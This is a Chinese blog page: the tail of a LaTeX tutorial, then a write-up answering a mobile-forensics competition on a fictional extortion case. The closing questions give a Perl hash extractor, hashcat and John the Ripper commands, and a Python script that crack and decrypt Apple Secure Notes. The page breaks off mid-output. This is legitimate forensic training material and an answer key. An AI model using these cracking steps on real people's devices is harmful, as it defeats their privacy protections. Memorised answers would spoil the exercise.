\\newtheorem{corollary}[theorem]{推论}\n创建了lemma和corollary环境，它们和theorem使用同一个计数器\n\\newtheorem{definition}{定义}\n创建了 definition 环境，它自己独立编号 (如 1, 2, 3 \u0026hellip;)\n使用解释:\n第一个definition显示为 “定义 1” theorem环境因为有[勾股定理]，所以显示为 “定理 1.1 (勾股定理)” proof环境自动添加了 “证明.” 和结尾的□符号 由于lemma、corollary与theorem共享编号，所以接下来的lemma显示为 “引理 1.2”，corollary显示为“推论1.3” 交叉引用 在LaTeX的手稿修改过程中，章节和图表的编号随时可能变化，要是让我们手动更新这些编号，等死就可以了\n好在LaTeX的交叉引用机制就很好解决了这个问题，我们之前也有提到过\n其原理是：\n为想要引用的、带编号的元素（章节、图片、表格、公式等）设置一个独一无二的标签(\\label) 在需要引用的地方，通过这个标签来提取它对应的编号 (\\ref) 或页码 (\\pageref) 核心命令 命令 作用与说明 \\label{标签名} 在一个带编号的元素后面设置一个看不见的标记\n标签名在文档中必须是唯一的 \\ref{标签名} 在文本中插入该标签对应的元素编号\n例如，如果\\label{fig:flow}跟着图2的标题，那么\\ref{fig:flow}就会显示为2 \\eqref{标签名} amsmath宏包提供的\\ref变体，专用于引用公式\n它会自动在编号两侧加上括号，例如(2) \\pageref{标签名} 在文本中插入该标签所在的页码 推荐的标签规范 为了避免标签名混乱和冲突，强烈推荐使用带前缀的命名方式：\n元素类型 推荐前缀 示例 章 (Chapter) ch: \\label{ch:background} 节 (Section) sec: \\label{sec:methodology} 图片 (Figure) fig: \\label{fig:results_chart} 表格 (Table) tab: \\label{tab:comparison} 公式 (Equation) eq: \\label{eq:main_theorem} 定理 (Theorem) thm: \\label{thm:pythagoras} 示例 \\documentclass{ctexart} \\usepackage{amsmath} \\usepackage{graphicx} \\begin{document} \\section{随便写写} \\label{sec:intro} 本文介绍一下交叉引用 \\begin{equation} E = mc^2 \\label{eq:emc} \\end{equation} \\section{方法} 在章节 \\ref{sec:intro} 中，我们已经提出了核心思想。图 \\ref{fig:placeholder} +1=2 公式 \\eqref{eq:emc}它位于第 \\pageref{eq:emc} 页。 \\begin{figure}[h] \\centering \\includegraphics[width=0.4\\textwidth]{2.png} \\caption{老图} \\label{fig:placeholder} \\end{figure} \\end{document} 编译结果：\n定义标签:\n在\\section{引言}后面，我们用\\label{sec:intro}将其标记 在equation环境中，我们用\\label{eq:emc}标记了公式 在figure环境的\\caption之后，我们用\\label{fig:placeholder}标记了图片 引用标签:\n章节 \\ref{sec:intro}在编译后会显示为 “章节 1” 图 \\ref{fig:placeholder}会显示为 “图 1” 公式 \\eqref{eq:emc}会显示为 “公式 (1)” 第 \\pageref{eq:emc} 页会显示为 “第 1 页” 如果我们在“随便写写”前再增加一个新的章节，那么原“随便写写”的编号会自动变为 2，而代码中所有 \\ref{sec:intro}的地方，输出也会自动更新为2，无需任何手动修改\n参考文献 BibTeX是LaTeX的标准参考文献管理系统，它将文献数据与排版样式彻底分离，实现了参考文献的完全自动化\n工作流程：\n创建一个.bib数据库文件，存放所有文献信息 在.tex文档的正文中，用\\cite{}命令引用文献 在.tex文档中指定引用的样式和.bib文件的位置 LaTeX编译器会自动完成文献的排序、格式化和列表生成 工作流程详解 创建.bib数据库文件 在Overleaf左侧文件栏，点击New File新建文件，命名为.bib后缀\n这是一个纯文本文件，用于存储文献条目\n添加文献条目 我们可以从Google Scholar、知网或各种学术数据库中直接导出BibTeX格式的条目，然后粘贴到.bib文件中\n这部分通常不用我们自己写，做个了解就行\n条目格式：\n@类型{引用密钥, 字段 = {值}, ... } 常用类型 说明 常用字段 说明 @article 期刊文章 author，title，year 作者, 标题, 年份 @book 书籍 journal，volume，pages 期刊名, 卷, 页码 @inproceedings 会议论文集中的一篇 publisher，address 出版社, 地址 @phdthesis 博士论文 doi，url 数字对象标识符, 网址 示例：\n@article{einstein1905, author = {Albert Einstein}, title = {Zur Elektrodynamik bewegter Körper}, journal = {Annalen der Physik}, year = {1905}, volume = {322}, pages = {891--921}, } 这里的einstein1905就是这篇文献独一无二的引用密钥\n在主文档中设置并引用 命令 作用 放置位置 \\bibliographystyle{样式} 设置参考文献的格式\n常用样式有：\nplain (按字母排序)\nunsrt (按引用顺序)\nalpha (作者+年份)\nabbrv (缩写) 文档末尾，\\bibliography之前 \\cite{引用密钥} 在正文中引用一篇或多篇文献 正文任意位置 \\bibliography{文件名} 指定.bib文件的位置，并在此处生成参考文献列表\n注意，文件名不用带.bib后缀 文档末尾，\\end{document}之前 示例 main.tex 文件:\n\\documentclass{ctexart} \\begin{document} \\section{引言} 引用文献1：\\cite{张健2008精确的程序静态分析} 引用文献2：\\cite{何伟渔1994语法的静态分析和动态分析} \\bibliographystyle{plain} \\bibliography{text} \\end{document} references.bib 文件:\n@phdthesis{张健2008精确的程序静态分析, title={精确的程序静态分析}, author={张健 and others}, year={2008} } @article{何伟渔1994语法的静态分析和动态分析, title={语法的静态分析和动态分析}, author={何伟渔}, journal={上海师范大学学报: 哲学社会科学版}, number={3}, pages={100--106}, year={1994} } 编译结果：\n在正文中，\\cite{何伟渔1994语法的静态分析和动态分析} 和 \\cite{张健2008精确的程序静态分析}会被LaTeX替换为[1]和[2]，因为plain样式是按作者字母排序的，这里我直接使用.bib文件的顺序，就是反着的\n\\bibliography{references}命令会扫描全文，发现只有这两篇文献被引用了\nLaTeX会自动读取references.bib文件中这两篇文献的数据，并根据plain样式，在文末生成一个格式化、排序好的参考文献列表，标题都不用写\n和所有语言一样，只会语法是远远不够的，一定得多上手编排一些文章进行练习，积累经验！\n下面是一些LaTeX练习网站，感兴趣可以看看：\nTEXnique ：互动式LaTeX编程游戏，需要在限定时间内用LaTeX代码实现它给出的公式\nLaTeX.org练习与解答 ：LaTeX.org的论坛中有用户分享的练习题和解答，内容涉及数学公式、文档结构等方面\n","date":"2025-08-19T21:20:24+08:00","image":"http://picture.928330.xyz/typora/LaTeX_logo.svg.jpg","permalink":"https://blog.928330.xyz/p/latex%E4%B8%8D%E5%A4%AA%E7%B2%BE%E9%80%9A%E7%9A%84%E6%95%99%E7%A8%8B/","title":"LaTeX：不太精通的教程"},{"content":"最诡异的一集，资格赛恐怖如斯\n过程中要数次用到数据库，最好可以使用navicate\n检材分卷压缩，一共九卷，解压之后使用Veracrypt挂载就能得到题目\n王晓琳手机(1-14) 1.王晓琳手机的IMEI号是什么?(以阿拉伯数字回答) 352978115584444 2.王晓琳的手机安装了什么即时通讯软件(lnstant Messaging Apps)? A. Signal\nB. 微信(WeChat)\nC. QQ\nD. WhatsApp\nE. LINE\n在应用列表看到了微信和WhatsApp，说明这一题是多选啊\n在基本信息 -\u0026gt; 应用列表里面过滤应用分类为\u0026quot;即时通信\u0026quot;，又发现一个没有显示的Signal：\nABD 3.王晓琳于什么日子和时间曾经通过即时通讯软件发出一个PDF档案?(以时区UTC+8回答) A.2022-09-30 17:39:53\nB.2022-10-01 17:39:53\nC.2022-09-30 18:30:28\nD.2022-10-01 16:30:22\n在WhatsApp的文件传输记录里找到一个名为staff A team.pdf：\nA 4.承上题，这个 PDF 档案的MD5哈希值(Hash Value) 是什么?(以大写英文及阿拉伯数字回答) 这个文件在挂载中好像改了名，变成了内部编号，所以我们在文件里面搜索不到\n不过直接在上题的聊天记录里面点击，就能在本地文件管理器找到挂载的这个pdf文件了：\n之后不管是用poweshell，还是在火眼里面计算都可以：\nAE0D6735BBE45B0B8F1AB7838623D9C8 5.王晓琳将这个PDF档案发给哪一个用户,而该用户的手机号码是什么? A.85297663607\nB.85259308538\nC.85269707307\nD.85246427813\n在好友消息里面一个个查找就行：\nB 6.王晓琳发出这个PDF档案的原因是什么? A.寻求协助\nB.分享档案内容\nC.错误发出\nD.无法开启\n看一下聊天记录就知道了：\nD 7.承上题，分析王晓琳与上述用户的对话，他们的关系是什么? A. 客户\nB. 师生\nC. 家人\nD. 同事\n同样是查看聊天记录，有电脑部、返工等等字样，应该是同事：\nD 其实从这里也就能看出，对方就是本案件嫌疑人林俊熙，两人应该是从同事变成恋人，而后分手\n后面的照片也和案件调查的内容对应上了\n8.王晓琳于何时要求上述用户删除一张照片? A. 2022-10-06\nB. 2022-09-28\nC. 2022-09-30\nD. 2022-10-03\n依旧聊天记录：\nD 9.承上题，该用户向王晓琳提出什么要求以删除这张照片? A. 金钱\nB. 毒品\nC. 性服务\nD. 加密货币\n同上题图，“比钱我就删除”，就是要钱\nA 10.王晓琳的手机里有什么电子书籍(Electronic Book) ? A. 三国演义\nB. 红楼梦\nC. 水浒传\nD. 西游记\n首先的思路就是去找有没有相关的app，但是现在支持详细分析的似乎没有一个是电子书阅读平台\n所以接下来就是去翻第二题找过的应用列表，但我也不知道哪个是阅读软件，所以要请出伟大的ai大人了\n不知道为什么我不能导出成csv，只能一段段截图喂给ai了：\nai真是太好用了你们知道吗\n但很遗憾，就算我找到了电子阅读书的软件，也不知道在哪找书的数据\n所以换一个思路，直接使用火眼的全局搜索功能把所有选项都找一遍：\n很幸运第一个选项三国演义就找到了：\nD选项当然也是没有的： A 11.王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果(Highlight)? A. 卿有何妙计\nB. 宝玉已是三杯过去了\nC. 武松那日早饭罢\nD. 就除他做个弼马温罢\n不知道怎么找，直接看选项\n选项B是红楼梦，C是水浒传，D应该是西游记，A就应该是三国演义了：\n为了保险我们直接全局搜索AD两项，也是很幸运，A又搜到了：\nA 12.王晓琳的手机里有一个 \u0026lsquo;MTR Mobile \u0026lsquo;(港铁)的手机程序(Mobile App)。检视其数据库(Database) 的数据，王晓琳于2022年10月11日 22:04 时将一行程加入书签(Bookmark)，这段行程的起点及终点站包括? A. 尖沙咀\nB. 红硒\nC. 康城\nD. 青衣\nE. 沙田\n直接在文件系统里面搜索MTR，可以在搜出来的同级目录下找到一个数据库：\n此外在MTRmobile文件夹下也有很多的数据库，不过我们先一个一个试，用SQLite类型连接数据库：\n这里面很多字段和选项一样，可能是找对了\nCREATE_DATE字段\n我们需要搜索2022年10月11日22:04之后的条目，先找个网站转换时间戳：\nhttps://tool.chinaz.com/tools/unixtime.aspx 使用sql语句在表里面查询：\nSELECT * FROM BookmarkNHistory WHERE CREATED_DATE \u0026gt;= 1665497040 ORDER BY CREATED_DATE; 只查询出来一条语句，应该就是目标：\nDE 13.王晓琳于2022年10月2日使用她的手机拍摄了多少张的照片?(以阿拉伯数字回答) 基本信息 -\u0026gt; 图片，把创建时间改成2022-10-2当天：\n每一张最好都看一下，我大致看了，应该都是风景照没错\n90 14.检视王晓琳的手机照片，她于2022年10月2日到过什么地方? A.大潭郊游径\nB.城门畔塘径\nC.大榄麦理浩径\nD.京士柏卫理径\n看来上一题全部看一遍是正确的，我们能找到这样一张图片：\nB 李大辉的Phone(15-24) 15.李大辉使用的是一台LG V10的手机，它的型号是什么? A. LGH960C\nB. LGH961N\nC. LGH960H\nD. LGH961C\nE. LGH961D\nB 16.李大辉的手机最常搜索的类别(Category) 是什么? A. 护肤品\nB. 旅游\nC. 运动\nD. 学校\n查看chrome浏览器的历史记录，发现最多的是关于化妆品一类的：\nA 17.李大辉最近光顾了一家美丰快运公司，这快递件的单号是什么?(不要输入符号及空白，以阿拉伯数字回答) 这题不会\n先是看了一遍图片，没有找到快递相关的东西\n又跑到文件里面找图片，七千多张翻了二十多页，啥也没有，太耗时间了，还给我火眼整的卡卡的\n我想到耗时任务里面有图片文字提取，但是使用要苍穹ai引擎，而且也没有关键词，不一定好找\n接着又在浏览器里面找，还是没有快递相关，遂放弃\n18.李大辉收到的电邮中有一个钓鱼链结(Phishing Link)，这个链结的地址是什么? A. 以上皆非\nB. https://bit.ly/3yeARcO C. https://bit.ly/5vM12 D. http://bit.ly/Hell0 在Gmail里面能找到：\nB 19.承上题，这封电邮是从哪个电邮地址寄出的? A. 以上皆非\nB. Cavinchow456@yahoo.com C. 2020ChanChan@hotmail.com D. 30624700Peter@proton.me 同上题图\nD 20.承上题，寄出这封电邮的IP地址是? A. 以上皆非\nB. 65.54.185.39\nC. 10.13.105.56\nD. 58.152.110.218\n这题我也不知道怎么做，查看了Gmail的\n不过10开头的好像是内网地址，不能在公网上路由？那也只能排除C\n21.李大辉手机有一个order.xlsx 的档案被加密了，解密钥匙是什么? A. 2022 Nov!\nB. 20221101\nC. Nov2022!\nD. P@sswOrd!\n这一题答案在图片中，或许应该庆幸十七题我把所有图片都看了一遍：\nC 不过这个选择题就四个选项，找到加密文件全部试一遍也试出来了，有点意义不明\n22.香港的街道上每一枝街灯都有编号。分析李大辉手机里的程序 \u0026lsquo;KMB 1933\u0026rsquo;， 哪一枝街灯在经度 (Latitude) 22.4160270000， 纬度 (Longitude) 114.2139450000 附近，它的编号是什么?(以大㝍英文及阿拉伯数字回答) 和十二题一样，搜索KMB，在文件目录下找到数据库：\n链接之后，找到kmb_routestopfile_ST表，只有这个表里面有经纬度：\nsql进行模糊查询：\nSELECT * FROM kmb_routestopfile_ST WHERE lat BETWEEN 22.416027 - 0.0005 AND 22.416027 + 0.0005 AND lng BETWEEN 114.213945 - 0.0005 AND 114.213945 + 0.0005 ORDER BY ABS(lat - 22.416027) + ABS(lng - 114.213945) LIMIT 10; CE1453 23.李大辉的手机里有一张由该手机拍的照片，照片的元资料(Metadata) 曾被修改，这张照片的档案名是什么?(以大写英文及数字回答，不用回答副档名 在Android.bin/分区57/media/0/DCIM/Camera路径下查看手机照片的创建时间和修改时间\n发现只有一张图片的c和m时间不一样： 20220922_152622.jpg 24.分析李大辉的手机里的资料，他在哪一间公司工作? A. 美丽好化妆品公司\nB. 步步高贸易公司\nC. 盛大国际有限公司\nD. 永恒化妆品公司\n微信和whatsapp都没有相关工作消息，最后在文件的pdf中找到了职员证：\nA 林浚熙的iphone(25-38) 25.林浚熙曾经以手机登录Google账户的验证码是什么?(不要输入符号，以大写英文及阿拉伯数字回答) 翻阅短信：\nG-785186 26.林浚熙手机的\u0026rsquo; WhatsApp\u0026rsquo; 号码是什么?(号码)@s.whatsapp.net? (以阿拉伯数字回答) 85259308538 27.通过分析林浚熙手机的照片，判断他在何处偷拍王晓琳? A. 交通工具\nB. 郊野公园\nC. 游泳池\nD. 酒店房间\n照片在之前王晓琳的聊天记录里面已经看到过，是酒店\nD 28.林浚熙曾经删掉自己拍摄的照片，这张照片的档案名(Filename) 是什么?(不要输入，以大写英文及阿拉伯数字回答。如Cat10.jpg，需回答CAT10JPG) IMG_0444.JPG 29.王晓琳曾经发送一个PDF档案予林浚熙，这个档案的文件签名(File Signature) 是什么?(以十六进制数字答首八位数值，如FOA1C5E1) 在本地资源管理器找到这个pdf，随便一个十六进制编辑器打开： D0CF11E0 30.承上题，该PDF档案内包含一位曾经被肩的受害者资料。分析林熙手机的数据，这位受害者的英文名字是什么?(不要输入符号及空白，以大写英文回答) 尝试直接打开失败，说不是pdf格式：\n哎呀，这才反应过来不是PDF文件，开头特征是office应用的，但是不知道是哪一种\n我们拖到linux里面使用file命令测试一下（截图太长就不放了）：\n┌──(kali㉿kali)-[~] └─$ file 111.pdf 111.pdf: Composite Document File V2 Document, Little Endian, Os: MacOS, Version 6.12, Code page: 10000, Author: user30, Last Saved By: user30, Name of Creating Application: Microsoft Macintosh Excel, Create Time/Date: Wed Sep 28 12:06:13 2022, Last Saved Time/Date: Fri Sep 30 10:37:41 2022, Security: 0 输出里面的Composite Document File V2 Document表明这是 OLE 容器格式，而Microsoft Macintosh Excel说明是 Excel生成的OLE文档，也就是.xls文件\n修改后缀名打开：\n林俊熙的手机好友消息里面只有一个消息与人名有关，在里面就找到了存在于表里面的人：\nWONG SAI PING 31.分析林浚熙手机上的数据，他在2022年10月17日计划去什么地方? A. 以上皆非\nB. 荃湾站\nC. 沙田站\nD. 国际金融中心二期\n在手机上发现了waze软件， 是一款非GPS导航与实时路况应用\n但分析出来的内容里面没有10月17日的行程：\n再去文件里面找一下waze，在ChunHei_iPhone.tar/AppDomain-com.waze.iphone/Documents路径下发现两个数据库，一个个查找，最终在user.db下找到了一个表，里面有时间和地点：\n这两个地点都在选项里面，时间是时间戳类型，都转换一下：\n第二个是17号的数据\nC 32.承上题，上述行程的结束时间是?(如答案为 1:01:59，需回答160159) 同上题图：\n124500 题目给的例子有问题吧\n33.于林浚熙的手机里，在2022年9月1日或以后，哪一张照片是由其他手机拍摄的，而它的档案名是什么?(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答CAT10JPG) 使用耗时任务的图片exif分析，分析完之后点左上角切换成行视图，再点击右边的设置列，把型号勾选上：\n过滤拍摄时间是2022-9-1之后的图片，发现有四张（实际三张）不是林俊熙的手机iphone XR，而是XS：\n然后做到这里就卡住了，题目说只有一张，但不知道怎么分辨\n34.根据照片的数据库（Photos.sqlite) 资料，哪一个栏目标题(Column Header) 可以显示这张照片的接收方式? A. ZIMPORTEDFROMSOURCEIDENTIFIER\nB. ZIMPORTEDBYBUNDLEIDENTIFIER\nC. ZRECEIVEMETHODIDENTIFIER\nD. ZRECEIVEDFROMIDENTIFIER\n搜索这个数据库：\n连接后查询四个选项哪一个在表里面，sqlite的机制和常见的mysql不一样，交给ai就好：\nSELECT \u0026#39;ZIMPORTEDFROMSOURCEIDENTIFIER\u0026#39; AS column_name, name AS table_name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZIMPORTEDFROMSOURCEIDENTIFIER%\u0026#39; UNION ALL SELECT \u0026#39;ZIMPORTEDBYBUNDLEIDENTIFIER\u0026#39;, name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZIMPORTEDBYBUNDLEIDENTIFIER%\u0026#39; UNION ALL SELECT \u0026#39;ZRECEIVEMETHODIDENTIFIER\u0026#39;, name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZRECEIVEMETHODIDENTIFIER%\u0026#39; UNION ALL SELECT \u0026#39;ZRECEIVEDFROMIDENTIFIER\u0026#39;, name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND sql LIKE \u0026#39;%ZRECEIVEDFROMIDENTIFIER%\u0026#39;; B 35.承上题，这张照片通过什么方式接收? A. 网页下载\nB. 蓝牙传送\nC. 以上皆非\nD. WhatsApp软件传送\nE. Signal软件传送\n上一题我们找到了含有接受方式字段的表格，一共有三张，经过查看发现ZADDITIONALASSETATTRIBUTES才是我们想要找的存储了所有图片的表格，利用sql查询33题找到的四张图片就行了吧：\nSELECT ZORIGINALFILENAME, ZIMPORTEDBYBUNDLEIDENTIFIER FROM ZADDITIONALASSETATTRIBUTES WHERE ZORIGINALFILENAME IN ( \u0026#39;IMG_0420.HEIC\u0026#39;, \u0026#39;IMG_0421.HEIC\u0026#39;, \u0026#39;IMG_0422.HEIC\u0026#39;, \u0026#39;IMG_0446.HEIC\u0026#39; ); 什么？竟然一张都没有找到！难道这几张图片根本就不存在？？？！！！\n再次返回表格，确实没有看见这几张图片，不过比对他们的时间却发现了猫腻：\n在数据库里面，这几张来自其他手机的、以.HEIC作为后缀的图片，似乎被重新命名了，有了另一个名称\n而且，这时也发现前文的IMG_0420.HEIC和IMG_0423.HEIC是同一张图片，不知道为什么存储了两次\n不过这些都不重要，知道了真正的名称，我们改动一下接着查询：\nSELECT ZORIGINALFILENAME, ZIMPORTEDBYBUNDLEIDENTIFIER FROM ZADDITIONALASSETATTRIBUTES WHERE ZORIGINALFILENAME IN ( \u0026#39;IMG_0381.HEIC\u0026#39;, \u0026#39;IMG_0383.HEIC\u0026#39;, \u0026#39;IMG_0730.HEIC\u0026#39; ); 四张图片的来源都是com.apple.sharingd，然后告诉ai大人吧：\n原来是airdrop，这玩意可比选项里面的快多了\nC 36.承上题，这张照片原本的档案名(Original Filename) 是什么?不要输入，以大写英文及阿拉伯数字回答。如 Cat10,jpg，需回答CAT10JPG) 看来上一题得到的名称还是很重要的\nIMG0730HEIC 37.林浚熙手机里有一个备忘录(Notes)被上了锁，这个备忘录的名称是什么?(以大写英文及阿拉数字回答) note里面一共四个备忘录数据，其中\u0026quot;halo\u0026quot;和\u0026quot;今天\u0026quot;两条数据是看不见的，不确定是哪个\n不过下一题会给出答案\n38.承上题，上述备忘录的内容有一串数字，它是什么?(以阿拉伯数字回答) 上网查找破解notes密码的方法，找到了下面这篇文章：\nhttps://www.kaotenforensic.com/cellebrite/blog/bruteforce-securenotes-hashcat/ 其中有着这样一段话：\n原来看数据库就能知道哪一个数据被加密了，看来以后得多看才是，我们导出看一眼：\n果真找到了对应数据，sql查询一下：\nZCRYPTOITERATIONCOUNT 显示加密迭代次数 ZISPASSWORDPROTECTED=1表示有密码保护，0表示没有 SELECT ZTITLE1, ZCRYPTOITERATIONCOUNT, ZISPASSWORDPROTECTED FROM ZICCLOUDSYNCINGOBJECT WHERE ZTITLE1 IN (\u0026#39;Halo\u0026#39;, \u0026#39;今天\u0026#39;); 什么，竟然这两个都真的被加密了，那谁还分得清啊！\n不要紧，正确答案是可以被解密出来有一串数字的，我们接着往下做\nnotes加密的原理大概就是使用PBKDF2和SHA256算法把简单密码通过反复的哈希拉伸成一个16字节密钥，那么我们就可以想办法从数据库文件（也就是NoteStore.sqlite）里面提取出这个hash，再对它进行爆破\n文章里给出了提取hash的perl语言脚本，这里我们保存成iOS_notes.pl：\n#!/usr/bin/env perl use strict; use warnings; use DBI; use DBD::SQLite; die \u0026#34;usage: $0 NoteStore.sqlite\\n\u0026#34; unless (scalar @ARGV == 1); my $database = shift @ARGV; my $dsn = \u0026#34;DBI:SQLite:dbname=$database\u0026#34;; my $userid = \u0026#34;\u0026#34;; my $password = \u0026#34;\u0026#34;; my $dbh = DBI-\u0026gt;connect ($dsn, $userid, $password, { RaiseError =\u0026gt; 1 }) or die $DBI::errstr; my $sth = $dbh-\u0026gt;prepare (\u0026#34;SELECT Z_PK,ZCRYPTOITERATIONCOUNT,ZCRYPTOSALT,ZCRYPTOWRAPPEDKEY FROM ZICCLOUDSYNCINGOBJECT WHERE ZISPASSWORDPROTECTED=1\u0026#34;); $sth-\u0026gt;execute () or die $DBI::errstr; while (my $row = $sth-\u0026gt;fetchrow_arrayref ()) { printf (\u0026#34;\\$ASN\\$*%d*%d*%s*%s\\n\u0026#34;, $row-\u0026gt;[0], $row-\u0026gt;[1], unpack (\u0026#34;H*\u0026#34;, $row-\u0026gt;[2]), unpack (\u0026#34;H*\u0026#34;, $row-\u0026gt;[3])); } $sth-\u0026gt;finish; $dbh-\u0026gt;disconnect (); exit (0); 我们也可以直接手动从数据库里面复制出来hash值，不过有现成的脚本不用白不用：\nperl iOS_notes.pl NoteStore.sqlite \u0026gt; hash.txt 而Apple Secure Notes的设计是一个账户的所有安全备忘录可以用同一个自定义密码解锁，也就是说不管我们取出来多少加密过的hash，只要破解出来一个就可以：\nhead -n 1 hash.txt \u0026gt; hash_first.txt Apple Secure Notes的加密算法对应16200这个模式，我们指定然后运行，这里用的是kali自带字典：\nhashcat -m 16200 -a 0 hash_first.txt /usr/share/wordlists/rockyou.txt 然而我是在一台Kali虚拟机里操作的，虚拟机环境无法直接调用物理GPU，Hashcat只能切换到CPU模式\n行吧，CPU就CPU，慢点就慢点，但第二个问题出现了：Hashcat的通用CPU驱动内存分配上限很低，而-m 16200恰恰要很多内存，这就导致跑不动破解的哈希算法\n为了解决这个问题，我折腾了很久：修复Kali的apt源、安装开源驱动、都没有用\n最后只能换一个工具（早该想到的）：John the Ripper，据说对CPU的支持非常出色，没有内存限制问题，而且kali也默认安装了它：\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash_first.txt 最后运行很成功，查看破解密码：\njohn --show hash_first.txt 234567 不过到这一步只是有密码而已，我们还需要得到内容\n我们还是处理NoteStore.sqlite数据库，加密数据可能在两个地方：ZICNOTEDATA表的ZDATA列（通常是笔记主体）或者ZICCLOUDSYNCINGOBJECT表的ZENCRYPTEDVALUESJSON列（通常是附件元数据等）\n或许最简单的方式就是手机仿真然后直接打开notes看一眼吧（我猜的），不过我并不知道如何这样做，也不知道能不能这样做，最后调教了很久的ai，处理了很久的环境问题，写出来了一个python脚本：\n#!/usr/bin/env python3 import sqlite3 import sys import zlib from Crypto.Cipher import AES from Crypto.Protocol.KDF import PBKDF2 from Crypto.Hash import SHA256 from cryptography.hazmat.primitives.keywrap import aes_key_unwrap from cryptography.hazmat.backends import default_backend def decrypt_aes_gcm(key, nonce, ciphertext, tag): \u0026#34;\u0026#34;\u0026#34;AES-GCM 解密\u0026#34;\u0026#34;\u0026#34; try: cipher = AES.new(key, AES.MODE_GCM, nonce=nonce) # 关联数据为空，不传 assoc_data return cipher.decrypt_and_verify(ciphertext, tag) except ValueError as e: print(f\u0026#34;[-] AES-GCM Decryption failed: {e}\u0026#34;) return None def main(): if len(sys.argv) != 3: print(f\u0026#34;Usage: {sys.argv[0]} NoteStore.sqlite password\u0026#34;) sys.exit(1) db_file = sys.argv[1] password = sys.argv[2].encode() conn = sqlite3.connect(db_file) cursor = conn.cursor() try: cursor.execute(\u0026#34;\u0026#34;\u0026#34; SELECT t1.Z_PK, t1.ZCRYPTOITERATIONCOUNT, t1.ZCRYPTOSALT, t1.ZCRYPTOWRAPPEDKEY, t1.ZENCRYPTEDVALUESJSON, t2.ZCRYPTOINITIALIZATIONVECTOR, t2.ZCRYPTOTAG, t2.ZDATA FROM ZICCLOUDSYNCINGOBJECT AS t1 JOIN ZICNOTEDATA AS t2 ON t1.Z_PK = t2.ZNOTE WHERE t1.ZISPASSWORDPROTECTED = 1 \u0026#34;\u0026#34;\u0026#34;) except sqlite3.OperationalError as e: print(f\u0026#34;[!] Database query failed. The schema might be different. Error: {e}\u0026#34;) conn.close() sys.exit(1) rows = cursor.fetchall() if not rows: print(\u0026#34;[!] No password protected notes found in the database.\u0026#34;) conn.close() return decryption_successful = False for row in rows: pk, iterations, salt, wrapped_key_blob, encrypted_json, iv_blob, tag_blob, data_blob = row print(f\u0026#34;\\n--- Processing Note Z_PK={pk} ---\u0026#34;) if not (salt and wrapped_key_blob): print(\u0026#34;[*] Skipping note due to missing salt or wrapped key.\u0026#34;) continue salt = bytes(salt) wrapped_key_blob = bytes(wrapped_key_blob) try: # 步骤 1: 派生主密钥 (KEK) print(\u0026#34;[+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...\u0026#34;) main_key = PBKDF2(password, salt, dkLen=16, count=iterations, hmac_hash_module=SHA256) # 步骤 2: 使用 cryptography AES Key Unwrap 解包笔记密钥 print(\u0026#34;[+] Step 2: Unwrapping note encryption key using AES Key Unwrap...\u0026#34;) aes_key = aes_key_unwrap(main_key, wrapped_key_blob, backend=default_backend()) print(\u0026#34;[+] Successfully unwrapped note key!\u0026#34;) except (ValueError, TypeError) as e: print(f\u0026#34;[!] Step 2 FAILED. This almost certainly means the password \u0026#39;{sys.argv[2]}\u0026#39; is incorrect. Error: {e}\u0026#34;) continue # 步骤 3: 选择要解密的笔记数据 data_to_decrypt = None source_column = \u0026#34;\u0026#34; if encrypted_json: data_to_decrypt = encrypted_json source_column = \u0026#34;ZENCRYPTEDVALUESJSON\u0026#34; elif data_blob: data_to_decrypt = data_blob source_column = \u0026#34;ZDATA from ZICNOTEDATA\u0026#34; else: print(f\u0026#34;[*] Note Z_PK={pk} key was unwrapped, but no content data found to decrypt.\u0026#34;) decryption_successful = True continue print(f\u0026#34;[+] Step 3: Found encrypted content in column \u0026#39;{source_column}\u0026#39;.\u0026#34;) data_to_decrypt = bytes(data_to_decrypt) # 步骤 4: AES-GCM 解密笔记内容 if not (iv_blob and tag_blob): print(f\u0026#34;[*] Skipping content decryption for Z_PK={pk}, missing IV or Tag in ZICNOTEDATA.\u0026#34;) continue nonce_d = bytes(iv_blob) tag_d = bytes(tag_blob) ciphertext_d = data_to_decrypt print(f\u0026#34;[+] Step 4: Decrypting note content using AES-GCM...\u0026#34;) plaintext_gzipped = decrypt_aes_gcm(aes_key, nonce_d, ciphertext_d, tag_d) if plaintext_gzipped: # 步骤 5: Gzip 解压 print(f\u0026#34;[+] Step 5: Decompressing Gzip data...\u0026#34;) try: decompressed_data = zlib.decompress(plaintext_gzipped, 16 + zlib.MAX_WBITS) print(f\u0026#34;======== DECRYPTED NOTE (Z_PK={pk}) ========\u0026#34;) # 只显示可解码文本，忽略不可打印字符 print(decompressed_data.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;)) print(f\u0026#34;{\u0026#39;=\u0026#39;*60}\\n\u0026#34;) decryption_successful = True except zlib.error as e: print(f\u0026#34;[!] Gzip decompression failed for Z_PK={pk}. Error: {e}\u0026#34;) print(f\u0026#34;Raw decrypted data (gzipped):\\n{plaintext_gzipped}\u0026#34;) conn.close() if not decryption_successful and rows: print(\u0026#34;\\n[!] Decryption failed for all notes. Please double-check the password.\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main() 简单说一下运行过程：\n脚本首先将我们输入的密码、从数据库ZICCLOUDSYNCINGOBJECT表中读取的盐和迭代次数 三者混合，进行20000次SHA256哈希，得到主密钥，用主密钥去解密从ZICCLOUDSYNCINGOBJECT表得到的 ZCRYPTOWRAPPEDKEY列，取出专门用于加密这条笔记内容的笔记密钥\n接着脚本会检查两个可能存放笔记内容的位置，使用笔记密钥配合从ZICNOTEDATA表中读取的初始化向量和认证标签，对加密内容进行解密\n最后解密出的数据并非纯文本，而是一个gzip压缩包，调用zlib.decompress函数对其进行解压，得到最终的二进制数据（Protobuf格式），再尽力将这些二进制数据解码为UTF-8文本，并将其中可读的部分打印在屏幕上\n嗯，真是太麻烦了\n总之下一步，使用下面的命令运行脚本，注意传入明文密钥（少什么库就下载什么）：\npython decrypt_notes.py NoteStore.sqlite \u0026#34;234567\u0026#34; 输出结果：\n--- Processing Note Z_PK=31 --- [+] Step 1: Deriving Key 